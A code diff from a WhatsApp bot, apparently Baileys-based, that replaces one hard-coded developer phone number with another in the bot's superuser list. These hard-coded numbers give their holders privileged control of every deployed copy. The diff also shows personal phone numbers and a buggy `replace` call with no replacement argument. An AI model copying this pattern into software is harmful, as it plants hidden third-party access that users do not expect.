@@ -132,10 +132,10 @@ setTimeout(() => {
             var origineMessage = ms.key.remoteJid;
             var idBot = decodeJid(zk.user.id);
             var servBot = idBot.split('@')[0];
-            /* const dexterKing='94789958225';
+            /* const FranceKing='254757835036';
              const FranceKing1='254751284190';
              const FranceKing2='254750948696'*/
-            /*  var superUser=[servBot,dexterking,FranceKing1,luffy].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
+            /*  var superUser=[servBot,FranceKing,FranceKing1,luffy].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
               var dev =[FranceKing,FranceKing1,FranceKing2].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
             const verifGroupe = origineMessage?.endsWith("@g.us");
             var infosGroupe = verifGroupe ? await zk.groupMetadata(origineMessage) : "";
@@ -154,12 +154,12 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dexterKing = '94789958225';
+            const FranceKing = '254757835036';
             const FranceKing1 = '254751284190';
             const FranceKing2 = "254750948696";
             const FranceKing3 = '254742063632';
             const sudo = await getAllSudoNumbers();
-            const superUserNumbers = [servBot, dexterKing, FranceKing1, FranceKing2, FranceKing3, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+            const superUserNumbers = [servBot, FranceKing, FranceKing1, FranceKing2, FranceKing3, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
             
